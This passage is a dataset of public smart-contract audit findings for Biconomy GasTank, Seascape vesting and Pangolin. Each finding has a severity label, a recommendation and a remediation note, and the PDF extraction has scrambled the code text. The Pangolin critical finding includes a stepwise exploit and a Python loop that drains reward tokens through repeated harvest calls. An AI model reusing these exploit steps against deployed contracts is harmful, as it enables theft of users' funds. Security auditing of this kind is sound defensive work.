["Halborn", "Biconomy_GasTank", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The project contains many instances of floating pragma. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too recent which has not been extensively tested. Code Location: Listing 13: DappGasTank.sol (Lines 1) 1 pragma solidity ^0.8.0; 2 // SPDX - License - Identifier : MIT Risk Level: Likelihood - 2 Impact - 2 Recommendations: Consider locking the pragma version with known bugs for the compiler When possible, do not use version by removing the caret (^) symbol. floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. 24 Remediation Plan: SOLVED: The Biconomy Team solved this issue by locking the pragma version. Commit ID: 4e2a4ada3f1629b51018dc45c4b9f1af6c2a02c4 25 ", "labels": ["Halborn", "Biconomy_GasTank", "Severity: Low"]}, {"title": "MISSING REENTRANCY PROTECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "To protect against cross-function re-entrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. Code Location: Listing 14: Missing Re-Entrancy Guard 1 function depositFor ( uint256 _fundingKey ) public payable 2 function withdraw ( uint256 _amount ) public onlyOwner Risk Level: Likelihood - 2 Impact - 2 26 Recommendations: DappGasTank.sol In the nonReentrant ReentrancyGuard library to the project and use the nonReentrant modifier to avoid introducing future re-entrancy vulnerabilities. missing OpenZeppelin functions recommended above to contract, modifier. add are is It a Listing 15: nonReentrant Modifier 1 function depositFor ( uint256 _fundingKey ) public nonReentrant payable 2 function withdraw ( uint256 _amount ) public onlyOwner nonReentrant Remediation Plan: SOLVED: pelins ReentrancyGuard. The Biconomy Team solved this issue by implementing OpenZep- Commit ID: 4e2a4ada3f1629b51018dc45c4b9f1af6c2a02c4 27 ", "labels": ["Halborn", "Biconomy_GasTank", "Severity: Low"]}, {"title": "DEPOSIT FUNCTION DOES NOT CONTROL ALLOWED TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the manual code review step, it has seen that allowedToken variable has implemented to the contract to control which token will be allowed to be deposited to the contract. There is also setTokenAllowed method on the contract to enable or disable tokens. Although, the depositFor() method does not check the value of allowedToken variable to decide which token is allowed to be deposited and which is not allowed. Code Location: Listing 16: DappGasTank.sol (Lines 69) 69 mapping ( address => bool ) public allowedTokens ; Listing 17: DappGasTank.sol (Lines 162) 160 function setTokenAllowed ( address token , bool allowed ) external onlyOwner { 161 162 163 164 } require ( token != address (0) , \" Token address cannot be 0 \"); allowedTokens [ token ] = allowed ; emit DepositTokenAdded ( token , msg . sender ); Listing 18: DappGasTank.sol 175 function depositFor ( uint256 _fundingKey ) public payable { 176 require ( msg . sender == tx . origin || msg . sender == _trustedForwarder , \" sender must be EOA or trusted forwarder \" ); 177 require ( msg . value > 0, \" No value provided to depositFor .\" ) ; 28 178 179 180 181 182 183 184 } require ( msg . value >= minDeposit , \" Must be grater than minimum deposit for this network \" ); masterAccount . transfer ( msg . value ); dappBalances [ _fundingKey ] = dappBalances [ _fundingKey ] + msg . value ; // review depositorBalances [ msg . sender ][ _fundingKey ] = depositorBalances [ msg . sender ][ _fundingKey ] + msg . value ; emit Deposit ( msg . sender , msg . value , _fundingKey ); Risk Level: Likelihood - 2 Impact - 1 29 Recommendations: It is suggested to check allowed tokens on depositFor() method. Listing 19: DappGasTank.sol (Lines 175,177) 175 function depositFor ( uint256 _fundingKey , address tokenAddress ) public payable { 176 177 178 179 180 181 182 183 184 185 } require ( msg . sender == tx . origin || msg . sender == _trustedForwarder , \" sender must be EOA or trusted forwarder \" ); require ( allowedTokens [ tokenAddress ], \" This token is not allowed . \"); require ( msg . value > 0, \" No value provided to depositFor .\" ) ; require ( msg . value >= minDeposit , \" Must be grater than minimum deposit for this network \" ); masterAccount . transfer ( msg . value ); dappBalances [ _fundingKey ] = dappBalances [ _fundingKey ] + msg . value ; // review depositorBalances [ msg . sender ][ _fundingKey ] = depositorBalances [ msg . sender ][ _fundingKey ] + msg . value ; emit Deposit ( msg . sender , msg . value , _fundingKey ); Remediation Plan: NOT APPLICABLE: This issue is not applicable in the current version. However, this will be applicable for extended depositFor() method in a future release. 30 ", "labels": ["Halborn", "Biconomy_GasTank", "Severity: Informational"]}, {"title": "UNUSED PRICE ORACLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the test, it was determined that a variable on the contract was not used for any purpose, although it was defined on the contract. This situation does not pose any risk in terms of security. But it is important for the readability and applicability of the code. Code Location: Listing 20: DappGasTank.sol (Lines 79) 78 // Pricefeeds info should you require to calculate Token / ETH 79 mapping ( address => address ) public tokenPriceFeed ; Risk Level: Likelihood - 1 Impact - 1 Recommendations: It is recommended to review the unused variables, and to delete it from the contract if it will be remained unused in the future. Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 31 3.10 STATIC ANALYSIS REPORT ", "labels": ["Halborn", "Biconomy_GasTank", "Severity: Informational"]}, {"title": "INVESTOR MULTI", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_MSCP_Token_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The addInvestor function, called only by the owner, does not check if the investor does have claimed already the tokens. The only performed check is the remainingCoins == 0 which will be true after the vesting period finishes (150 days for strategic and 300 days for private). When the vesting period finishes, the owner can call addInvestor, this will reset the remainingCoins for the investor. Having the reset the amount of remaining tokens allows the investor to withdraw again the max amount of tokens. This is possible since the getDuration function will return the total duration (startTime did not change), allowing to re-claim the total tokens again. This process can be repeated. POC:  Add an investor with addInvestor  Wait for the vesting period to finish (150/300 days)  Withdraw the tokens using the investor account  Owner can call again the addInvestor function  Withdraw the tokens again Code Location: Listing 1: contracts/MscpVesting (Lines 51) 50 function addInvestor ( address _investor , bool _strategicInvestor ) external onlyOwner { require ( balances [ _investor ]. remainingCoins == 0 , \" investor already has allocation \" ); if ( _strategicInvestor ){ 51 52 53 11 Figure 1: PoC showing the double withdraw balances [ _investor ]. remainingCoins = TOTAL_STRATEGIC ; balances [ _investor ]. strategicInvestor = true ; } else balances [ _investor ]. remainingCoins = TOTAL_PRIVATE ; emit InvestorModified ( _investor , balances [ _investor ]. remainingCoins ); 54 55 56 57 58 59 60 } Risk Level: Likelihood - 3 Impact - 5 Recommendation: Check if the investor already has claimedBonus tokens. If this value is different from zero, it means that the investor is already vested. 12 Remediation Plan: SOLVED IN THE DEPLOYMENT: The issue will be solved in the deployment implementing a multi-signature wallet. 13 ", "labels": ["Halborn", "Seascape_MSCP_Token_Vesting", "Severity: High"]}, {"title": "UNUSED CODE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_MSCP_Token_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The burn function on the MscpToken does contain unnecessary code. Code Location: Listing 2: contracts/MscpToken.sol (Lines 97) 96 97 98 function burn ( uint256 amount ) public onlyBridge { require ( false , \" Only burnFrom is allowed \" ); } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the onlyBridge modifier and directly raise Only burnFrom is allowed. Remediation Plan: SOLVED: The code was removed by the Seascape team. 14 MANUAL TESTING 15 4.1 Introduction Halborn performed different manual tests in all the contracts, trying to find logic flaws and vulnerabilities that were not detected by the automatic tools. During the manual testing, multiple questions were considered while evaluating each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Can a function be called twice in the same block causing issues?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation. . .  Are the function parameters and variables controlled by external contracts?  Can extended contracts cause issues on the extender contract? The following graph, Figure 2, displays the inheritance on both audited contracts. G N I T S E T L A U N A M Figure 2: MscpToken and MscpVesting inheritance graph The Figure 3 and Figure 4 show the call flow present on the contracts. 16 G N I T S E T L A U N A M Figure 3: MscpToken call graph 17 G N I T S E T L A U N A M Figure 4: MscpVesting call graph 18 4.2 Stateful testing The MscpToken was fully verified for being ERC20 compliant before the stateful testing. [[attachments/token_erc20_compliant.png]] The token was tested against stateful testing scripts made to verify current existing token implementations such as OpenZeppelin ERC20 tokens ERC20-PBT The contract was executed against: - StateMachine - MintingStateMachine (since mint functionality exists) The results showed no issues at all. 4.3 Manual checks Both strategic and private should have the same amount at the end of the period. Checking for max withdrawal after the period finished for an strategic account, and a none strategic account (private): G N I T S E T L A U N A M 19 G N I T S E T L A U N A M 20 ", "labels": ["Halborn", "Seascape_MSCP_Token_Vesting", "Severity: Informational"]}, {"title": "REWARD PERIOD CAN BE EXTENDED INDEFINITELY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract MiniChefV2 the functions fundRewards, extendRewardsViaFunding and extendRewardsViaFunding perform internally the following function call: SUSHI.safeTransfer(address(this), AmountOfTokensToTransfer); This call does not make much sense as it is transferring tokens from the smart contract balance to itself address(this) which allows the following exploitable scenario: 1. Contract MiniChefV2 is deployed. 2. Pool is added by the owner of the contract. 3. Owner of the contract transfer 20e18 SUSHI tokens to the MiniChefV2 contract. 4. Owner of the contract calls minichef.fundRewards(1000000000000000000, 86400, {'from': owner.address}). This means that just 1e18 SUSHI tokens were set as a reward for a total period of 86400 seconds (1 day). Once this reward period is finished and the tokens were harvested by the users, 19e18 SUSHI tokens should still remain in 16 the contract. 5. Attacker calls deposit function, for example depositing 1000 LP tokens into pool id 0. 43200 seconds (12 hours) later. . . 6. Attacker calls harvest and receives 500092592592589392 SUSHI tokens. These tokens are sent through the harvest function: Listing 1: MiniChefV2.sol - function harvest (Lines 331) 320 function harvest ( uint256 pid , address to ) public { PoolInfo memory pool = updatePool ( pid ); 321 UserInfo storage user = userInfo [ pid ][ msg . sender ]; 322 int256 accumulatedSushi = int256 ( user . amount . mul ( pool . 323 accSushiPerShare ) / ACC_SUSHI_PRECISION ); 324 325 326 327 328 329 uint256 _pendingSushi = accumulatedSushi . sub ( user . rewardDebt ). toUInt256 () ; // Effects user . rewardDebt = accumulatedSushi ; // Interactions 17 330 331 332 333 334 335 336 337 338 339 340 } if ( _pendingSushi != 0) { SUSHI . safeTransfer (to , _pendingSushi ); } IRewarder _rewarder = rewarder [ pid ]; if ( address ( _rewarder ) != address (0) ) { _rewarder . onSushiReward ( pid , msg . sender , to , _pendingSushi , user . amount ); } emit Harvest ( msg . sender , pid , _pendingSushi ); And. . . the exploit itself: 7. User1 calls minichef.extendRewardsViaFunding(19499907407407410608, 0, {'from': user1.address}. Note that the amount specified is the total balance of SUSHI reward tokens of the MiniChefV2 contract: This is possible as extendRewardsViaFunding is an external function and has no onlyOwner modifier. It can be called by anyone: Listing 2: 459) MiniChefV2.sol - function extendRewardsViaFunding (Lines 451 function extendRewardsViaFunding ( uint256 funding , uint256 minExtension ) external { require ( funding > 0, \" MiniChefV2 : funding amount cannot be zero \" ); uint256 extensionDuration = funding / sushiPerSecond ; require ( extensionDuration >= minExtension , \" MiniChefV2 : insufficient extension limit \"); rewardsExpiration = rewardsExpiration . add ( extensionDuration ); SUSHI . safeTransfer ( address ( this ) , funding ); emit LogRewardsExpiration ( rewardsExpiration ); 452 453 454 455 456 457 458 459 460 461 462 } 18 8. Right after this call the reward period was extended. As the reward rate is kept, the attacker now can call the harvest function every fixed periods of time until retrieving the 20e18 total reward tokens: Listing 3 1 i = 1 2 while i <=40: 3 4 5 6 7 print (\" Iteration -> \" + str ( i)) output . yelloww (\" Sleeping 43200 seconds ...\") chain . sleep (43200) chain . mine (1) output . yelloww (\" Call -> minichef . harvest (0 , user1 . address , { ' from ': user1 . address }) \") minichef . harvest (0 , user1 . address , { ' from ': user1 . address }) output . redd (\" lptoken1 . balanceOf ( user1 . address ) -> \" + str ( lptoken1 . balanceOf ( user1 . address )) ) output . redd (\" sushi . balanceOf ( user1 . address ) -> \" + str ( sushi . balanceOf ( user1 . address )) ) output . greenn (\" sushi . balanceOf ( minichef . address ) -> \" + str ( sushi . balanceOf ( minichef . address )) ) i= i +1 8 9 10 11 12 ITERATION 1: ITERATION 10: 19 ITERATION 20: ITERATION 30: LAST 3 ITERATIONS: Even if the owner of the contract only funded 1e18 reward tokens the attacker managed to steal the total amount: 20e18. 20 Risk Level: Likelihood - 5 Impact - 5 Recommendation: Halborn recommends adding the onlyOwner modifier to the functions extendRewardsViaFunding and extendRewardsViaDuration. it is recommended to review and update accordingly the functions where SUSHI.safeTransfer is used. Also, Remediation Plan: SOLVED: Pangolin team fixed all the functions by using safeTransferFrom (msg.sender, address(this), funding);. The issue previously was that safeTransfer(address(this), funding); was being used. This call was basically transferring the tokens from the smart contract balance to the smart contract balance which makes no sense. using safeTransferFrom(msg.sender, address(this), funding); By the tokens are now being transferred from the person that calls the function fundRewards, extendRewardsViaFunding and extendRewardsViaFunding to the smart contract as it was intended in the first place. We can see below the code changes performed by Pangolin team which totally corrected this issue. At the left, the old code and at the right, the fixed code: fundRewards: 21 extendRewardsViaFunding and extendRewardsViaFunding: 22 ", "labels": ["Halborn", "Pangolin", "Severity: Critical"]}, {"title": "INCORRECT LOGIC IN MINICHEFV2 LEADS TO DOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract MiniChefV2 the function deposit allows any user to deposit LP tokens into a pool. On the other hand, the function fundRewards allows the owner of the contract and the funders to set up some rewards for those users that had deposited tokens into the contract. There is a logic flaw in the updatePool function that causes a partial Denial of Service under the following circumstances: 1. Contract MiniChefV2 is deployed. 2. Pool/pools are added by the owner of the contract. 3. A random user calls deposit function, for example depositing 1000 tokens into pool id 0. 4. Owner tries to call fundRewards function but it reverts (underflow). Proof of Concept: 23 Internally, the function fundRewards performs a SUSHI.safeTransfer and then calls massUpdateAllPools function, which, at the same time, calls updatePool function. After the user1s initial deposit of 1000 tokens, lpSupply variable is higher than 0, entering the if. Since the contract was just deployed and fundRewards was never called, the state variable rewardsExpiration still equals to 0, which means that block.timestamp will always be >= rewardsExpiration. This causes the line rewardsExpiration.sub(pool.lastRewardTime); to be executed. As no uint can be lower than 0, this operation reverts with an underflow. Code Location: Listing 4: MiniChefV2.sol - function updatePool (Lines 261) 254 function updatePool ( uint256 pid ) public returns ( PoolInfo memory 255 256 257 258 259 260 261 262 263 264 265 266 267 pool ) { pool = poolInfo [ pid ]; if ( block . timestamp > pool . lastRewardTime ) { uint256 lpSupply = lpToken [ pid ]. balanceOf ( address ( this )) ; if ( lpSupply > 0) { uint256 time = block . timestamp <= rewardsExpiration ? block . timestamp . sub ( pool . lastRewardTime ) : rewardsExpiration . sub ( pool . lastRewardTime ); uint256 sushiReward = time . mul ( sushiPerSecond ). mul ( pool . allocPoint ) / totalAllocPoint ; pool . accSushiPerShare = pool . accSushiPerShare . add (( sushiReward . mul ( ACC_SUSHI_PRECISION ) / lpSupply ). to128 () ); } pool . lastRewardTime = block . timestamp . to64 () ; poolInfo [ pid ] = pool ; emit PoolUpdate ( pid , pool . lastRewardTime , lpSupply , pool . accSushiPerShare ); 268 269 } } 24 Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to modify the updatePool function to take into account this edge case. Remediation Plan: SOLVED: Pangolin team solved this issue. This edge case was handled with the following code. At the left, the old code and at the right, the fixed code: We can see, how in the fixed code, the edge case is taken into account. When block.timestamp > rewardsExpiration and rewardsExpiration <= pool. lastRewardTime time will be set to zero avoiding the previous underflow. Below we can see the execution of this edge case and how now is correctly handled: 25 26 ", "labels": ["Halborn", "Pangolin", "Severity: High"]}, {"title": "LACK OF INTEGER OVERFLOW/UNDERFLOW PROTECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits, either larger than the maximum or lower than the minimum value. Some of the operations in the contracts are using SafeMath correctly, other operations are not using SafeMath but make use of some of the SafeMath functions and others do not use any kind of SafeMath making the operations vulnerable to overflows and underflows. Code Location: LiquidityPoolManager - Overflow Listing 5: LiquidityPoolManager.sol (Lines 268,278) 245 function calculateReturns () public { 246 require (! readyToDistribute , ' LiquidityPoolManager :: calculateReturns : Previous returns not distributed . Call distributeTokens () '); 247 require ( unallocatedPng > 0, ' LiquidityPoolManager :: calculateReturns : No PNG to allocate . Call vestAllocation () . '); 248 249 250 251 252 253 254 255 if ( pngPairs . length () > 0) { require (!( avaxPngPair == address (0) ) , ' LiquidityPoolManager :: calculateReturns : Avax / PNG Pair not set '); } // Calculate total liquidity distribution = new uint []( numPools ); uint totalLiquidity = 0; 27 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 } // Add liquidity from AVAX pairs for ( uint i = 0; i < avaxPairs . length () ; i ++) { uint pairLiquidity = getAvaxLiquidity ( avaxPairs . at ( i )) ; distribution [i ] = pairLiquidity ; totalLiquidity = SafeMath . add ( totalLiquidity , pairLiquidity ); } // Add liquidity from PNG pairs if ( pngPairs . length () > 0) { uint conversionRatio = getAvaxPngRatio () ; for ( uint i = 0; i < pngPairs . length () ; i ++) { uint pairLiquidity = getPngLiquidity ( pngPairs . at (i ) , conversionRatio ); distribution [ i + avaxPairs . length () ] = pairLiquidity ; totalLiquidity = SafeMath . add ( totalLiquidity , pairLiquidity ); } } // Calculate tokens for each pool uint transferred = 0; for ( uint i = 0; i < distribution . length ; i ++) { uint pairTokens = distribution [ i ]. mul ( unallocatedPng ). div ( totalLiquidity ); distribution [i ] = pairTokens ; transferred = transferred + pairTokens ; } readyToDistribute = true ; LiquidityPoolManager - Underflow 1 Listing 6: LiquidityPoolManager.sol (Lines 296) 287 function distributeTokens () public nonReentrant { 288 require ( readyToDistribute , ' LiquidityPoolManager :: distributeTokens : Previous returns not allocated . Call calculateReturns () '); readyToDistribute = false ; address stakeContract ; uint rewardTokens ; for ( uint i = 0; i < distribution . length ; i ++) { 289 290 291 292 28 293 294 295 296 297 298 299 300 301 302 303 304 305 } if ( i < avaxPairs . length () ) { stakeContract = stakes [ avaxPairs . at ( i ) ]; } else { stakeContract = stakes [ pngPairs . at (i - avaxPairs . length () ) ]; } rewardTokens = distribution [i ]; if ( rewardTokens > 0) { require ( IPNG ( png ). transfer ( stakeContract , rewardTokens ) , ' LiquidityPoolManager :: distributeTokens : Transfer failed '); StakingRewards ( stakeContract ). notifyRewardAmount ( rewardTokens ); } } unallocatedPng = 0; LiquidityPoolManager - Underflow 2 Listing 7: LiquidityPoolManager.sol (Lines 322) 314 function distributeTokensSinglePool ( uint pairIndex ) external 315 316 317 318 319 320 321 322 323 324 325 326 327 328 nonReentrant { require ( readyToDistribute , ' LiquidityPoolManager :: distributeTokensSinglePool : Previous returns not allocated . Call calculateReturns () '); require ( pairIndex < numPools , ' LiquidityPoolManager :: distributeTokensSinglePool : Index out of bounds '); address stakeContract ; if ( pairIndex < avaxPairs . length () ) { stakeContract = stakes [ avaxPairs . at ( pairIndex ) ]; } else { stakeContract = stakes [ pngPairs . at ( pairIndex - avaxPairs . length () ) ]; } uint rewardTokens = distribution [ pairIndex ]; if ( rewardTokens > 0) { distribution [ pairIndex ] = 0; require ( IPNG ( png ). transfer ( stakeContract , rewardTokens ) , ' LiquidityPoolManager :: distributeTokens : Transfer failed 29 '); 329 StakingRewards ( stakeContract ). notifyRewardAmount ( rewardTokens ); 330 331 } }  Same overflows/underflows are also present in LiquidityPoolManagerV2 .sol.  Some mathematical and in TreasuryVester.sol are not making use of SafeMath making them vulnerable as well (see MythX output). MiniChefV2.sol, operations PNG.sol Risk Level: Likelihood - 3 Impact - 3 Recommendation: Currently not all the smart contracts and the operations within them are using the SafeMath library which makes some operations vulnerable to overflows/underflows. In those contracts with Solidity versions <0.8.0 it is recommended to use the SafeMath library for arithmetic operations consistently throughout ALL the mathematical operations in the smart contract system. Reference: Ethereum Smart Contract Best Practices - Integer Overflow and Underflow Remediation Plan: SOLVED: Pangolin team successfully protected the overflow/underflow vulnerable functions. 30 ", "labels": ["Halborn", "Pangolin", "Severity: Medium"]}, {"title": "FUNCTION MIGRATE MISSING ONLYOWNER MODIFIER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract MiniChefV2.sol the function migrate() allows migrating LP tokens to another LP contract through the migrator contract. Listing 8: MiniChefV2.sol - migrate functions (Lines 189,203,204,205) 188 function setMigrator ( IMigratorChef _migrator ) public onlyOwner { require (! migrationDisabled , \" MiniChefV2 : migration has been 189 disabled \" ); migrator = _migrator ; emit MigratorSet ( address ( _migrator )); 190 191 192 } 193 194 // / @notice Permanently disable the ` migrator ` functionality . 195 // / This can only effectively be called once . 196 function disableMigrator () public onlyOwner { 197 198 199 } 200 201 // / @notice Migrate LP token to another LP contract through the ` migrationDisabled = true ; emit MigratorDisabled () ; migrator ` contract . 202 // / @param _pid The index of the pool . See ` poolInfo `. 203 function migrate ( uint256 _pid ) public { 204 require (! migrationDisabled , \" MiniChefV2 : migration has been disabled \" ); 205 require ( address ( migrator ) != address (0) , \" MiniChefV2 : no migrator set \" ); IERC20 _lpToken = lpToken [ _pid ]; uint256 bal = _lpToken . balanceOf ( address ( this )); _lpToken . approve ( address ( migrator ) , bal ); IERC20 newLpToken = migrator . migrate ( _lpToken ); require ( bal == newLpToken . balanceOf ( address ( this )) , \" MiniChefV2 : migrated balance must match \" ); lpToken [ _pid ] = newLpToken ; emit Migrate ( _pid ); 206 207 208 209 210 211 212 31 213 } As we can see, migrate function can be called by anyone as long as migrationDisabled equals False and migrator address is set. Initially, after the contract deployment, migrationDisabled is already initialized with the value False and the migrator address would equal to address(0). This means that as soon as the function setMigrator is called by the owner of the contract setting the migrator address, anyone would be able to call the migrate function. Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to add the onlyOwner modifier also to the migrate function. Remediation Plan: SOLVED: Pangolin team added the onlyOwner modifier to the migrate function. 32 ", "labels": ["Halborn", "Pangolin", "Severity: Medium"]}, {"title": "IMPRECISION IN REWARD DISTRIBUTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contract StakingRewards.sol allows the users that previously had deposited some tokens to withdraw them and claim some PNG tokens as a reward. The function getRewardForDuration() shows how many PNG tokens will be given as a reward. Due to some imprecision in the calculation of the rewards, the users will receive less PNG tokens than the actual amount deserved. For example: Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to define some precision values as constants at the beginning of the contracts and use them in the mathematical operations in order to avoid/reduce the loss of precision. Remediation Plan: RISK ACCEPTED: Pangolin team accepts this risk. 33 ", "labels": ["Halborn", "Pangolin", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Some constructors and functions are missing address validation. Every address should be validated and checked that is different than zero. Code location: Airdrop.sol - constructor(address png_, address uni_, address sushi_, address owner_, address remainderDestination_) - function setRemainderDestination(address remainderDestination_) - function setowner(address owner_) - function whitelistAddress(address addr, uint96 pngOut) - function whitelistAddresses(address[] memory addrs, uint96[] memory pngOuts) CommunityTreasure.sol - constructor(address png_) GovernorAlpha.sol - constructor(address timelock_, address png_, address guardian_) MiniChefV2.sol - constructor(IERC20 _sushi, address _firstOwner) - function deposit(uint256 pid, uint256 amount, address to) - function withdraw(uint256 pid, uint256 amount, address to) - function harvest(uint256 pid, address to) - function withdrawAndHarvest(uint256 pid, uint256 amount, address to) - function emergencyWithdraw(uint256 pid, address to) - function addFunder(address _funder) - function removeFunder(address _funder) 34 PNG.sol - constructor(address account) - function delegate(address delegatee) - function delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s) PangolinVoteCalculator.sol - constructor(address _png, address _liquidityManager) - function changeLiquidityPoolManager(address _liquidityManager) RewarderComplex.sol - constructor (IERC20 _rewardToken, uint256 _tokenPerBlock, address _- MASTERCHEF_V2) - function onSushiReward (uint256 pid, address _user, address to, uint256, uint256 lpToken) - function pendingTokens(uint256 pid, address user, uint256) - function pendingToken(uint256 _pid, address _user) RewarderSimple.sol - constructor (uint256 _rewardMultiplier, IERC20 _rewardToken, address _MASTERCHEF_V2) - function onSushiReward (uint256, address user, address to, uint256 sushiAmount, uint256) StakingRewards.sol - constructor - function recoverERC20(address tokenAddress, uint256 tokenAmount) Timelock.sol - constructor(address admin_, uint delay_) - function setPendingAdmin(address pendingAdmin_) - function queueTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) - function cancelTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) - function executeTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) 35 TreasuryVester.sol - constructor(address png_) TreasuryVesterProxy.sol - constructor(address _png, address _treasuryVester, address _treasury, address _chef) Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to validate that every address input is different than zero. Remediation Plan: RISK ACCEPTED: Pangolin team accepts this risk. 36 ", "labels": ["Halborn", "Pangolin", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Code Location: Listing 9 1 TreasuryVesterProxy . sol :1: pragma solidity 0.8.0; 2 StakingRewards . sol :1: pragma solidity ^0.7.6; 3 RewarderComplex . sol :3: pragma solidity 0.6.12; 4 Timelock . sol :1: pragma solidity ^0.5.16; 5 CommunityTreasury . sol :1: pragma solidity ^0.7.6; 6 GovernorAlpha . sol :1: pragma solidity ^0.5.16; 7 LiquidityPoolManagerV2 . sol :1: pragma solidity ^0.7.6; 8 RewarderSimple . sol :3: pragma solidity 0.6.12; 9 PNG . sol :1: pragma solidity ^0.5.16; 10 LiquidityPoolManager . sol :1: pragma solidity ^0.7.6; 11 MiniChefV2 . sol :3: pragma solidity 0.6.12; 12 PangolinVoteCalculator . sol :1: pragma solidity 0.8.0; 13 Airdrop . sol :2: pragma solidity ^0.8.0; 14 TreasuryVester . sol :1: pragma solidity ^0.7.6; Risk Level: Likelihood - 1 Impact - 3 37 Recommendation: It is not recommended to use a Consider locking the pragma version. It is possible to lock the pragma by floating pragma in production. fixing the version both in truffle-config.js for Truffle framework or in hardhat.config.js for HardHat framework. Remediation Plan: SOLVED: The version was locked in the hardhat.config.js file. 38 ", "labels": ["Halborn", "Pangolin", "Severity: Low"]}, {"title": "DEPRECATED PRAGMA VERSION OF SOLC", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The pragma versions of Solc used by the smart contracts are: - 0.5.16 - 0.6.12 - 0.7.6 - 0.8.0 While the old versions are still functional, and most security issues are mitigated by using other utility contracts such as SafeMath.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Risk Level: Likelihood - 1 Impact - 3 Recommendation: At the time of this audit, the current version is already at 0.8. When possible, use the updated pragma versions to take advantage of new features, for example, after the Solidity version 0.8.0 Arithmetic operations revert on underflow and overflow by default. By using this version, utility contracts like SafeMath.sol would not be needed. Remediation Plan: RISK ACCEPTED: Pangolin team accepts this risk. 39 ", "labels": ["Halborn", "Pangolin", "Severity: Low"]}, {"title": "EXPERIMENTAL FEATURES ENABLED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pangolin_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(. . . ) as arguments in external function calls or in event data without prior assignment to a local variable. Using return does not trigger the bug. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Furthermore, arrays with elements shorter than 32 bytes may not be handled correctly even if the base type is an integer type. Encoding such arrays in the way described above can lead to other data in the encoding being overwritten if the number of elements encoded is not a multiple of the number of elements that fit a single slot. If nothing follows the array in the encoding (note that dynamically-sized arrays are always encoded after statically-sized arrays with statically-sized content), or if only a single array is encoded, no other data is overwritten. There are known 